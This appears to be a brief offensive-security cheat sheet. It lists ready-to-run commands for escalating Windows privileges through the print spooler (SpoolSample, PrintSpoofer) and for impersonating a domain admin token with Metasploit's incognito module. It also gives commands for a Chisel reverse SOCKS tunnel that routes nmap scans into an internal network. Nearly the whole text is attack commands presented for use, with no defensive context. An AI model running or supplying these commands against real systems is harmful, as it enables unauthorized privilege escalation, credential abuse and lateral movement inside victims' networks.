# Windows Credential

## SpoolSV Exploitation
```powershell
SpoolSample.exe [Host Machine] [Target Pipe] <appsrv01\test>
PrintSpooferNet.exe [Target Pipe] <\\.\pipe\test\pipe\spoolss>
```
## Metasploit
```powershell
#Inside Metasploit 
load incognito
list_tokens -u
impersonate_token corp1\\admin
getuid
```

# Network 

## Chisel Tunnel
```bash
#Server Side
./chisel server -p 8001 --reverse

#Client Side
./chisel client [Server IP Address]:8001 R:1080:socks

#Server Side
proxychains4 nmap [IP Address]
```
